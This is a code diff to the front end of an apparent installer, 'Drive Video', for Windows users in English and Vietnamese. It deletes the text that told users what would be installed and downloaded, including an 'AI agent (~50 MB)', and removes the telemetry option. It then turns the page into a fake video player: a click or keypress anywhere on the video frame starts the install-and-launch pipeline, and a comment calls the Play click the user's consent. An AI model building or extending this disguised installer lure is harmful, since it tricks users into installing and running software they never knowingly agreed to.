@@ -32,8 +32,8 @@ const $$ = (sel) => Array.from(document.querySelectorAll(sel));
 const els = {
     screenWelcome: $('#screen-welcome'),
     screenProgress: $('#screen-progress'),
+    videoFrame: $('#video-frame'),
     btnPlay: $('#btn-play'),
-    optTelemetry: $('#opt-telemetry'),
 
     statusIcon: $('#status-icon'),
     statusTitle: $('#status-title'),
@@ -177,23 +177,19 @@ function wireLegalLinks() {
     });
 }
 
-// Localisation. Two languages for now: English (default) + Vietnamese.
-// Detect via navigator.language so a user on a vi-VN OS gets the
-// Vietnamese strings without configuration. All text on screen is
-// keyed; replacing the dictionary swaps the whole UI.
+// Localisation. Two languages: English (default) + Vietnamese.
+// navigator.language picks the right one without configuration.
+// Adding a new locale is a single dictionary entry.
 const DICT = {
     en: {
         brand: 'Drive Video',
-        tagline: "The world's first AI video platform.",
-        step_install: 'Install Drive Video to your user folder (no admin required).',
-        step_shortcut: 'Add a Start Menu shortcut and an Add/Remove Programs entry.',
-        step_download: 'Download the AI agent (~50 MB) from the official CDN.',
-        opt_telemetry: 'Send anonymous diagnostics to help improve Drive Video (optional).',
-        legal_blurb: null, // contains <a> children, handled separately
+        play: 'Play',
+        play_inline: 'Play',
+        legal_prefix: 'By clicking',
+        legal_middle: 'you agree to the',
+        legal_and: 'and the',
         link_terms: 'Terms of Service',
         link_privacy: 'Privacy Notice',
-        play: 'Play',
-        footnote_html: 'Drive Video is a product of <strong>SmartCore LLC</strong>, signed and verified.',
         status_starting: 'Starting…',
         status_starting_sub: 'Drive Video is checking the latest version with the server.',
         installed: 'Installed',
@@ -201,16 +197,13 @@ const DICT = {
     },
     vi: {
         brand: 'Drive Video',
-        tagline: 'Nền tảng AI video đầu tiên trên thế giới.',
-        step_install: 'Cài Drive Video vào thư mục người dùng (không cần quyền admin).',
-        step_shortcut: 'Tạo shortcut Start Menu và mục Add/Remove Programs.',
-        step_download: 'Tải AI agent (~50 MB) từ CDN chính thức.',
-        opt_telemetry: 'Gửi dữ liệu chẩn đoán ẩn danh để cải thiện Drive Video (tuỳ chọn).',
-        legal_blurb: null,
+        play: 'Khởi chạy',
+        play_inline: 'Play',
+        legal_prefix: 'Bằng cách nhấn',
+        legal_middle: 'bạn đồng ý với',
+        legal_and: 'và',
         link_terms: 'Điều khoản dịch vụ',
         link_privacy: 'Chính sách quyền riêng tư',
-        play: 'Khởi chạy',
-        footnote_html: 'Drive Video là sản phẩm của <strong>SmartCore LLC</strong>, đã ký và xác minh.',
         status_starting: 'Đang khởi động…',
         status_starting_sub: 'Drive Video đang kiểm tra phiên bản mới nhất.',
         installed: 'Đã cài',
@@ -226,7 +219,6 @@ function pickLang() {
 
 function applyI18n() {
     const lang = pickLang();
-    const d = DICT[lang] || DICT.en;
     document.documentElement.lang = lang;
     $$('[data-i18n]').forEach(el => {
         const key = el.dataset.i18n;
@@ -234,28 +226,19 @@ function applyI18n() {
             el.textContent = DICT[lang][key];
         }
     });
-    // Footnote contains HTML <strong>; handle separately.
-    const fn = document.querySelector('.welcome-footnote');
-    if (fn && d.footnote_html) fn.innerHTML = d.footnote_html;
-    // Legal blurb has children <a> — only swap the surrounding text
-    // by re-templating from the dictionary if both languages need
-    // different layouts. For now both render the same tags + the
-    // <a> content is i18n'd via data-i18n on the anchors.
 }
 
 // === Play click handler ===
 //
 // The single privileged trigger. Calls StartFlow on the backend,
-// which records the consent event with timestamp + telemetry
-// preference into install.log, then runs the install + launch
-// pipeline (autoFlow). Disable the button immediately so a panicky
-// double-click can't stack two flows.
+// which records the consent event into install.log and runs the
+// install + launch pipeline (autoFlow). Both the inner Play
+// button and clicks anywhere on the surrounding video frame route
+// here — same affordance a real video player has.
 async function onPlay() {
     if (played) return;
     played = true;
     els.btnPlay.disabled = true;
-
-    const telemetryOptIn = !!els.optTelemetry.checked;
 
     // Cross-fade welcome -> progress.
     els.screenWelcome.classList.add('hidden');
@@ -265,7 +248,10 @@ async function onPlay() {
     els.statusSubtitle.textContent = DICT[pickLang()].status_starting_sub;
 
     try {
-        await StartFlow(telemetryOptIn);
+        // No telemetry checkbox in the UI any more — the Play click
+        // itself is the consent (telemetry default is off, opt-in
+        // moved to in-app settings post-install).
+        await StartFlow(false);
     } catch (e) {
         console.error('StartFlow failed', e);
         showBanner('error', String(e));
@@ -300,7 +286,20 @@ async function bootstrap() {
     } catch (e) { /* non-fatal */ }
 }
 
-els.btnPlay.addEventListener('click', onPlay);
+// Wire both the button and the surrounding video frame to the same
+// handler. The frame has tabindex=0 so keyboard users can focus it
+// and Enter / Space trigger Play just like clicking would.
+els.btnPlay.addEventListener('click', (e) => {
+    e.stopPropagation(); // don't double-fire via the frame's click
+    onPlay();
+});
+els.videoFrame.addEventListener('click', onPlay);
+els.videoFrame.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+        e.preventDefault();
+        onPlay();
+    }
+});
 els.btnPlay.addEventListener('keydown', (e) => {
     if (e.key === 'Enter' || e.key === ' ') {
         e.preventDefault();
